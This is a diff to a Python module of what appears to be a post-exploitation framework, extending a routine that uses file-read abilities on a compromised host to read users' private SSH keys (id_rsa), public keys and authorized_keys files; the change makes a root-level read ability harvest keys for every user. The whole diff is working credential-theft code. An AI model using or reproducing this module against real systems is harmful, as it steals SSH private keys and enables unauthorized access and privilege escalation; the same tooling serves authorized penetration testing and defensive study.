@@ -18,64 +18,77 @@ class Module(EnumerateModule):
         """Locate usable file read abilities and generate escalations"""
 
         # Ensure users are already cached
-        list(session.iter_users())
+        all_users = list(session.iter_users())
+        already_leaked = []
 
         for ability in session.run("enumerate", types=["ability.file.read"]):
 
-            user = session.find_user(uid=ability.uid)
-            if user is None:
-                continue
+            if ability.uid == 0:
+                users = all_users
+            else:
+                user = session.find_user(uid=ability.uid)
+                if user is None:
+                    continue
+                users = [user]
 
-            yield Status(f"leaking key for [blue]{user.name}[/blue]")
+            for user in users:
+                if user in already_leaked:
+                    continue
 
-            ssh_path = session.platform.Path(user.home, ".ssh")
-            authkeys = None
-            pubkey = None
-            # We assume its an authorized key even if we can't read authorized_keys
-            # This will be modified if connection ever fails.
-            authorized = True
+                yield Status(f"leaking key for [blue]{user.name}[/blue]")
 
-            try:
-                with ability.open(session, str(ssh_path / "id_rsa"), "r") as filp:
-                    privkey = filp.read()
-            except (ModuleFailed, FileNotFoundError, PermissionError):
-                yield Status(
-                    f"leaking key for [blue]{user.name}[/blue] [red]failed[/red]"
-                )
-                continue
+                ssh_path = session.platform.Path(user.home, ".ssh")
+                authkeys = None
+                pubkey = None
+                # We assume its an authorized key even if we can't read authorized_keys
+                # This will be modified if connection ever fails.
+                authorized = True
 
-            try:
-                with ability.open(session, str(ssh_path / "id_rsa.pub"), "r") as filp:
-                    pubkey = filp.read()
-                if pubkey.strip() == "":
-                    pubkey = None
-            except (ModuleFailed, FileNotFoundError, PermissionError):
-                yield Status(
-                    f"leaking pubkey [red]failed[/red] for [blue]{user.name}[/blue]"
-                )
-
-            if pubkey is not None and pubkey != "":
                 try:
-                    with ability.open(
-                        session, str(ssh_path / "authorized_keys"), "r"
-                    ) as filp:
-                        authkeys = filp.read()
-                    if authkeys.strip() == "":
-                        authkeys = None
+                    with ability.open(session, str(ssh_path / "id_rsa"), "r") as filp:
+                        privkey = filp.read()
                 except (ModuleFailed, FileNotFoundError, PermissionError):
                     yield Status(
-                        f"leaking authorized keys [red]failed[/red] for [blue]{user.name}[/blue]"
+                        f"leaking key for [blue]{user.name}[/blue] [red]failed[/red]"
+                    )
+                    continue
+
+                try:
+                    with ability.open(
+                        session, str(ssh_path / "id_rsa.pub"), "r"
+                    ) as filp:
+                        pubkey = filp.read()
+                    if pubkey.strip() == "":
+                        pubkey = None
+                except (ModuleFailed, FileNotFoundError, PermissionError):
+                    yield Status(
+                        f"leaking pubkey [red]failed[/red] for [blue]{user.name}[/blue]"
                     )
 
-            if pubkey is not None and authkeys is not None:
-                # We can identify if this key is authorized
-                authorized = pubkey.strip() in authkeys
+                if pubkey is not None and pubkey != "":
+                    try:
+                        with ability.open(
+                            session, str(ssh_path / "authorized_keys"), "r"
+                        ) as filp:
+                            authkeys = filp.read()
+                        if authkeys.strip() == "":
+                            authkeys = None
+                    except (ModuleFailed, FileNotFoundError, PermissionError):
+                        yield Status(
+                            f"leaking authorized keys [red]failed[/red] for [blue]{user.name}[/blue]"
+                        )
 
-            yield PrivateKey(
-                self.name,
-                str(ssh_path / "id_rsa"),
-                ability.uid,
-                privkey,
-                False,
-                authorized=authorized,
-            )
+                if pubkey is not None and authkeys is not None:
+                    # We can identify if this key is authorized
+                    authorized = pubkey.strip() in authkeys
+
+                yield PrivateKey(
+                    self.name,
+                    str(ssh_path / "id_rsa"),
+                    user.id,
+                    privkey,
+                    False,
+                    authorized=authorized,
+                )
+
+                already_leaked.append(user)
